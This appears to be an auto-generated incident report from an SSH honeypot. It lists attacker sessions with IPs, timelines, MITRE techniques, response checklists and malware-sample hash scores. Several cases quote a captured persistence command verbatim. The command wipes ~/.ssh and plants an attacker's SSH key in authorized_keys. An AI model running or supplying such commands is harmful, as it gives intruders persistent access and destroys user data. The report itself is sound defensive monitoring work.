| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-04 00:57 |
| **Last Seen** | 2026-11-04 00:58 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_095c071e93a685d51d75143700688497_small_control'"'"' '"'"'check_095c071e93a685d51d75143700688497'"'"'', printf '\n%s|%s\n' 'check_095c071e93a685d51d75143700688497_small_control' 'check_095c071e93a685d51d75143700688497', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_095c071e93a685d51d75143700688497_small_math'"'"' "$((403*832+69))"', (403*832+69, printf '\n%s|%s\n' 'check_095c071e93a685d51d75143700688497_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:57:30` | `cowrie.session.connect` |
| `2026-11-04 00:57:33` | `cowrie.client.version` |
| `2026-11-04 00:57:33` | `cowrie.client.kex` |
| `2026-11-04 00:57:48` | `cowrie.login.success` |
| `2026-11-04 00:57:56` | `cowrie.client.size` |
| `2026-11-04 00:57:59` | `cowrie.session.params` |
| `2026-11-04 00:58:01` | `cowrie.command.input` |
| `2026-11-04 00:58:01` | `cowrie.command.input` |
| `2026-11-04 00:58:01` | `cowrie.command.input` |
| `2026-11-04 00:58:01` | `cowrie.command.input` |
| `2026-11-04 00:58:01` | `cowrie.command.input` |
| `2026-11-04 00:58:01` | `cowrie.command.input` |
| `2026-11-04 00:58:01` | `cowrie.command.input` |
| `2026-11-04 00:58:01` | `cowrie.command.input` |
| `2026-11-04 00:58:01` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec1255c9085c

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]143` |
| **First Seen** | 2026-11-04 00:58 |
| **Last Seen** | 2026-11-04 00:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:58:40` | `cowrie.session.connect` |
| `2026-11-04 00:58:40` | `cowrie.client.version` |
| `2026-11-04 00:58:40` | `cowrie.client.kex` |
| `2026-11-04 00:58:41` | `cowrie.login.success` |
| `2026-11-04 00:58:43` | `cowrie.session.params` |
| `2026-11-04 00:58:43` | `cowrie.command.input` |
| `2026-11-04 00:58:43` | `cowrie.command.failed` |
| `2026-11-04 00:58:43` | `cowrie.log.closed` |
| `2026-11-04 00:58:44` | `cowrie.session.params` |
| `2026-11-04 00:58:44` | `cowrie.command.input` |
| `2026-11-04 00:58:44` | `cowrie.session.file_download` |
| `2026-11-04 00:58:44` | `cowrie.log.closed` |
| `2026-11-04 00:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]143` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]143` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47bdbd8077fc

| Field | Detail |
|---|---|
| **Source IP** | `58.186.20[.]143` |
| **First Seen** | 2026-11-04 00:58 |
| **Last Seen** | 2026-11-04 00:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:58:45` | `cowrie.session.connect` |
| `2026-11-04 00:58:45` | `cowrie.client.version` |
| `2026-11-04 00:58:45` | `cowrie.client.kex` |
| `2026-11-04 00:58:46` | `cowrie.login.success` |
| `2026-11-04 00:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.186.20[.]143` to AbuseIPDB if not already reported
- [ ] Block `58.186.20[.]143` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-962ac6c144d4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-11-04 00:59 |
| **Last Seen** | 2026-11-04 01:00 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 00:59:31` | `cowrie.session.connect` |
| `2026-11-04 00:59:35` | `cowrie.client.version` |
| `2026-11-04 00:59:35` | `cowrie.client.kex` |
| `2026-11-04 00:59:50` | `cowrie.login.success` |
| `2026-11-04 00:59:57` | `cowrie.client.size` |
| `2026-11-04 00:59:59` | `cowrie.session.params` |
| `2026-11-04 01:00:02` | `cowrie.log.closed` |
| `2026-11-04 01:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c5ab403f6a

| Field | Detail |
|---|---|
| **Source IP** | `115.190.126[.]68` |
| **First Seen** | 2026-11-04 01:02 |
| **Last Seen** | 2026-11-04 01:07 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 01:02:05` | `cowrie.session.connect` |
| `2026-11-04 01:02:07` | `cowrie.client.version` |
| `2026-11-04 01:02:07` | `cowrie.client.kex` |
| `2026-11-04 01:02:08` | `cowrie.login.success` |
| `2026-11-04 01:07:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.190.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b8a0c070c5a

| Field | Detail |
|---|---|
| **Source IP** | `14.225.26[.]33` |
| **First Seen** | 2026-11-04 01:02 |
| **Last Seen** | 2026-11-04 01:02 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 01:02:24` | `cowrie.session.connect` |
| `2026-11-04 01:02:30` | `cowrie.login.success` |
| `2026-11-04 01:02:30` | `cowrie.session.params` |
| `2026-11-04 01:02:35` | `cowrie.log.closed` |
| `2026-11-04 01:02:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.26[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.225.26[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05086700279f

| Field | Detail |
|---|---|
| **Source IP** | `101.227.203[.]162` |
| **First Seen** | 2026-11-04 01:04 |
| **Last Seen** | 2026-11-04 01:09 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 01:04:04` | `cowrie.session.connect` |
| `2026-11-04 01:04:04` | `cowrie.client.version` |
| `2026-11-04 01:04:04` | `cowrie.client.kex` |
| `2026-11-04 01:04:05` | `cowrie.login.success` |
| `2026-11-04 01:04:06` | `cowrie.session.params` |
| `2026-11-04 01:04:06` | `cowrie.command.input` |
| `2026-11-04 01:04:06` | `cowrie.command.failed` |
| `2026-11-04 01:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.227.203[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.227.203[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a632a4c076

| Field | Detail |
|---|---|
| **Source IP** | `114.32.151[.]97` |
| **First Seen** | 2026-11-04 01:09 |
| **Last Seen** | 2026-11-04 01:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 01:09:51` | `cowrie.session.connect` |
| `2026-11-04 01:09:51` | `cowrie.client.version` |
| `2026-11-04 01:09:51` | `cowrie.client.kex` |
| `2026-11-04 01:09:52` | `cowrie.login.success` |
| `2026-11-04 01:09:53` | `cowrie.session.params` |
| `2026-11-04 01:09:53` | `cowrie.command.input` |
| `2026-11-04 01:09:53` | `cowrie.command.failed` |
| `2026-11-04 01:09:53` | `cowrie.log.closed` |
| `2026-11-04 01:09:54` | `cowrie.session.params` |
| `2026-11-04 01:09:54` | `cowrie.command.input` |
| `2026-11-04 01:09:55` | `cowrie.session.file_download` |
| `2026-11-04 01:09:55` | `cowrie.log.closed` |
| `2026-11-04 01:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.32.151[.]97` to AbuseIPDB if not already reported
- [ ] Block `114.32.151[.]97` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ad196e7506

| Field | Detail |
|---|---|
| **Source IP** | `114.32.151[.]97` |
| **First Seen** | 2026-11-04 01:09 |
| **Last Seen** | 2026-11-04 01:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 01:09:55` | `cowrie.session.connect` |
| `2026-11-04 01:09:55` | `cowrie.client.version` |
| `2026-11-04 01:09:55` | `cowrie.client.kex` |
| `2026-11-04 01:09:56` | `cowrie.login.success` |
| `2026-11-04 01:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.32.151[.]97` to AbuseIPDB if not already reported
- [ ] Block `114.32.151[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd159a4c9382

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-04 01:10 |
| **Last Seen** | 2026-11-04 01:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 01:10:28` | `cowrie.session.connect` |
| `2026-11-04 01:10:28` | `cowrie.client.version` |
| `2026-11-04 01:10:28` | `cowrie.client.kex` |
| `2026-11-04 01:10:29` | `cowrie.login.success` |
| `2026-11-04 01:10:29` | `cowrie.direct-tcpip.request` |
| `2026-11-04 01:10:29` | `cowrie.direct-tcpip.data` |
| `2026-11-04 01:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0570a4d1ec13

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-11-04 01:22 |
| **Last Seen** | 2026-11-04 01:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 01:22:44` | `cowrie.session.connect` |
| `2026-11-04 01:22:44` | `cowrie.client.version` |
| `2026-11-04 01:22:44` | `cowrie.client.kex` |
| `2026-11-04 01:22:44` | `cowrie.login.success` |
| `2026-11-04 01:22:45` | `cowrie.session.params` |
| `2026-11-04 01:22:45` | `cowrie.command.input` |
| `2026-11-04 01:22:45` | `cowrie.command.failed` |
| `2026-11-04 01:22:46` | `cowrie.log.closed` |
| `2026-11-04 01:22:46` | `cowrie.session.params` |
| `2026-11-04 01:22:46` | `cowrie.command.input` |
| `2026-11-04 01:22:46` | `cowrie.session.file_download` |
| `2026-11-04 01:22:46` | `cowrie.log.closed` |
| `2026-11-04 01:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbdd1d44bd11

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]247` |
| **First Seen** | 2026-11-04 01:22 |
| **Last Seen** | 2026-11-04 01:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 01:22:46` | `cowrie.session.connect` |
| `2026-11-04 01:22:46` | `cowrie.client.version` |
| `2026-11-04 01:22:47` | `cowrie.client.kex` |
| `2026-11-04 01:22:47` | `cowrie.login.success` |
| `2026-11-04 01:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f551716b151f

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-11-04 01:22 |
| **Last Seen** | 2026-11-04 01:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-04 01:22:49` | `cowrie.session.connect` |
| `2026-11-04 01:22:49` | `cowrie.client.version` |
| `2026-11-04 01:22:49` | `cowrie.client.kex` |
| `2026-11-04 01:22:50` | `cowrie.login.success` |
| `2026-11-04 01:22:51` | `cowrie.session.params` |
| `2026-11-04 01:22:51` | `cowrie.command.input` |
| `2026-11-04 01:22:51` | `cowrie.command.failed` |
| `2026-11-04 01:22:51` | `cowrie.log.closed` |
| `2026-11-04 01:22:52` | `cowrie.session.params` |
| `2026-11-04 01:22:52` | `cowrie.command.input` |
| `2026-11-04 01:22:52` | `cowrie.session.file_download` |
| `2026-11-04 01:22:52` | `cowrie.log.closed` |
| `2026-11-04 01:22:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (4) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-b92824957f42 | HIGH | `196.92.7[.]249` | 2026-11-04 01:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-656907aa77b2 | HIGH | `154.144.225[.]226` | 2026-11-04 01:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-62e2d34003b5 | HIGH | `72.46.87[.]211` | 2026-11-04 02:11 | Y | 3 | 0 | `T1078 · T1083` |
| IR-be86716756c4 | HIGH | `35.206.158[.]12` | 2026-11-04 02:26 | Y | 0 | 0 | `T1078 · T1592` |

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.93.141[.]94` | 1 | 2026-11-04 01:37 | 2026-11-04 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.93.141[.]95` | 1 | 2026-11-04 01:41 | 2026-11-04 01:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `108.54.8[.]132` | 1 | 2026-11-04 00:39 | 2026-11-04 00:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.249[.]177` | 1 | 2026-11-04 00:17 | 2026-11-04 00:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-04 00:02 | 2026-11-04 00:03 | 55s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-11-04 00:04 | 2026-11-04 00:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-11-04 02:19 | 2026-11-04 02:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.225.26[.]33` | 1 | 2026-11-04 00:59 | 2026-11-04 00:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.231.236[.]98` | 1 | 2026-11-04 01:16 | 2026-11-04 01:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.239.71[.]244` | 1 | 2026-11-04 02:35 | 2026-11-04 02:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | 1 | 2026-11-04 00:55 | 2026-11-04 00:56 | 13s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]10` | 1 | 2026-11-04 02:15 | 2026-11-04 02:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.163.57[.]236` | 1 | 2026-11-04 02:03 | 2026-11-04 02:03 | 9s | 0 | `T1592` | 🟢 LOW |
| `216.218.206[.]68` | 1 | 2026-11-04 01:37 | 2026-11-04 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-11-04 02:50 | 2026-11-04 02:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.206.158[.]12` | 1 | 2026-11-04 02:26 | 2026-11-04 02:26 | 7s | 0 | `T1592` | 🟢 LOW |
| `35.206.181[.]209` | 1 | 2026-11-04 02:29 | 2026-11-04 02:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]134` | 1 | 2026-11-04 02:44 | 2026-11-04 02:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.74.51[.]79` | 1 | 2026-11-04 02:14 | 2026-11-04 02:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.208.198[.]178` | 1 | 2026-11-04 01:29 | 2026-11-04 01:29 | 2s | 0 | `T1592` | 🟢 LOW |
| `60.28.38[.]66` | 1 | 2026-11-04 00:44 | 2026-11-04 00:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]77` | 1 | 2026-11-04 02:23 | 2026-11-04 02:23 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-11-04 01:40 | 2026-11-04 01:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]160` | 1 | 2026-11-04 00:26 | 2026-11-04 00:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]14` | 1 | 2026-11-04 01:16 | 2026-11-04 01:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.141.12[.]219` | 1 | 2026-11-04 00:33 | 2026-11-04 00:33 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
